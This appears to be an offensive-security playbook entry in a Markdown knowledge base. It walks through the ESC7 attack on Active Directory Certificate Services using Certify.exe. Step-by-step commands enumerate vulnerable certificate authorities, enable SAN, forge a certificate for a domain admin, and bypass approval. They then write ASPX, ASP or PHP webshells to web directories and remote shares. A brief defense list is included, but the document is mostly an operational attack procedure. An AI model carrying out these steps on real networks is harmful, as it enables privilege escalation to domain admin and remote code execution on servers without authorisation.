---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
sub_techniques:
  - >-
    [[sub-techniques/Bypass User Account Control|T1548.002 - Bypass User Account
    Control]]
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Certificate Services]]'
  - '[[tags/ESC7 - Vulnerable Certificate Authority Access Control]]'
commands:
  - '[[commands/certify-find-vulnerable-cas]]'
  - '[[commands/certify-enable-san-extension]]'
  - '[[commands/certify-request-user-certificate-with-san]]'
  - '[[commands/certify-issue-certificate]]'
  - '[[commands/certify-disable-approval-requirement]]'
  - '[[commands/certify-get-cdp-list]]'
  - '[[commands/certify-write-aspx-shell-local]]'
  - '[[commands/certify-write-default-asp-shell-local]]'
  - '[[commands/certify-write-php-shell-remote]]'
platforms:
  - Windows
tools:
  - '[[tools/Certify]]'
validated: true
---

# Vulnerable-Certificate-Authority-Access-Control

## Summary

Vulnerable Certificate Authority Access Control is a procedure that exploits misconfigurations in Active Directory Certificate Services (AD CS) to allow low-privileged users to request and issue fraudulent certificates, enabling privilege escalation, defense evasion, and remote code execution (RCE) through certificate-based authentication bypass and shell deployment.

## Description

This procedure targets vulnerabilities in AD CS where Certificate Authorities (CAs) grant excessive permissions like ManageCA or Manage Certificates to domain users. Attackers use tools like Certify.exe to enumerate vulnerable CAs, enable Subject Alternative Name (SAN) extensions for arbitrary principal name requests, issue certificates impersonating high-privilege accounts (e.g., domain admins), and leverage Certificate Distribution Points (CDPs) to write webshells to web-accessible directories on the CA server or remote shares. This leads to RCE on the CA server, which often has high privileges in the domain. The technique is part of ESC7 from the Certified Pre-Owned guide and is realistic in environments with legacy or misconfigured AD CS setups. Prerequisites include domain user credentials and network access to the CA.

## Requirements

1. Domain user credentials with access to query AD CS.
2. Certify.exe tool downloaded and executable on a Windows machine in the domain.
3. Network connectivity to the domain controllers and CA server.
4. PowerShell execution policy allowing script runs (or run as admin).

## Defense

- Implement least-privilege access controls on AD CS templates and permissions; restrict ManageCA and Manage Certificates to admins only.
- Monitor for anomalous certificate requests, especially those with SAN extensions or unusual altNames via Event ID 4886 in Certificate Services logs.
- Regularly audit CA configurations and disable unnecessary extensions like SAN for user templates.
- Enable certificate pinning and short validity periods for high-privilege certs; use tools like BloodHound to detect ESC7 paths.

## Objectives

1. Identify and exploit vulnerable CAs to request fraudulent certificates.
2. Escalate privileges by impersonating domain admins via certificate authentication.
3. Achieve RCE by writing webshells to CA or remote web directories for persistent access.

## Instructions

### Step 1: Find Vulnerable Certificate Authorities

**Context**: Scan the domain for CAs that allow low-privileged users to manage certificates or CAs, indicating potential ESC7 vulnerabilities. This step identifies exploitable templates and permissions.

**Command** ([[commands/certify-find-vulnerable-cas]]):
```powershell
Certify.exe find /vulnerable
```

> This command queries Active Directory for vulnerable CAs and outputs details on permissions like ManageCA. Run it from a domain-joined machine with user creds. If vulnerable CAs are found, note the CA name (e.g., SERVER\ca-name) for later steps.

### Step 2: Enable Subject Alternative Name (SAN) Extension

**Context**: Modify the CA configuration to allow SAN extensions in certificate requests, enabling attackers to specify arbitrary UPNs or DNS names for impersonation.

**Command** ([[commands/certify-enable-san-extension]]):
```powershell
Certify.exe setconfig /enablesan /restart
```

> This enables the SAN extension for all templates under the vulnerable CA and restarts the certsvc service. Requires ManageCA permissions. Verify by re-running the vulnerability scan; SAN should now be enabled.

### Step 3: Request User Certificate with Arbitrary SAN

**Context**: Request a certificate using a vulnerable template, specifying an arbitrary SAN (e.g., a domain admin UPN) to create a fraudulent cert for authentication.

**Command** ([[commands/certify-request-user-certificate-with-san]]):
```powershell
Certify.exe request /template:User /altname:$_ALTNAME
```

> Replace $_ALTNAME with the target principal (e.g., super.adm for domain admin). This submits a pending request if approval is required. The output includes a Request ID for issuance.

### Step 4: Issue Certificate or Disable Approval Requirement

**Context**: Approve the pending certificate request or remove the approval requirement entirely to obtain the fraudulent certificate without admin intervention.

**Command** ([[commands/certify-issue-certificate]]):
```powershell
Certify.exe issue /id:$_REQUEST_ID
```

> Use the Request ID from Step 3 to issue the cert. Alternatively, if approval can't be bypassed directly:

**Command** ([[commands/certify-disable-approval-requirement]]):
```powershell
Certify.exe setconfig /removeapproval /restart
```

> This disables pending requests globally for the CA. The issued cert (.pfx) can now be used for authentication (e.g., with Rubeus for tickets).

### Step 5: Retrieve CDP List and Write Webshells

**Context**: Use ManageCA permissions to query writable CDPs (remote shares or local paths) and write shell payloads to achieve RCE on the CA server or remote web servers.

**Command** ([[commands/certify-get-cdp-list]]):
```powershell
Certify.exe writefile /ca:$_CA_NAME /readonly
```

> Replace $_CA_NAME with the vulnerable CA (e.g., SERVER\ca-name). This lists writable paths like web roots or shares.

For exploitation, write custom shells:

**Command** ([[commands/certify-write-aspx-shell-local]]):
```powershell
Certify.exe writefile /ca:$_CA_NAME /path:$_PATH /input:$_INPUT_FILE
```

> Example: Write a custom ASPX shell to local CA path (e.g., C:\inetpub\wwwroot\shell.aspx) from local input file.

**Command** ([[commands/certify-write-default-asp-shell-local]]):
```powershell
Certify.exe writefile /ca:$_CA_NAME /path:$_PATH
```

> Writes Certify's default ASP shell to a local web directory (e.g., c:\inetpub\wwwroot\shell.asp).

**Command** ([[commands/certify-write-php-shell-remote]]):
```powershell
Certify.exe writefile /ca:$_CA_NAME /path:$_REMOTE_PATH /input:$_INPUT_FILE
```

> Writes a PHP shell to a remote share (e.g., \\remote.server\share\shell.php) from local input.
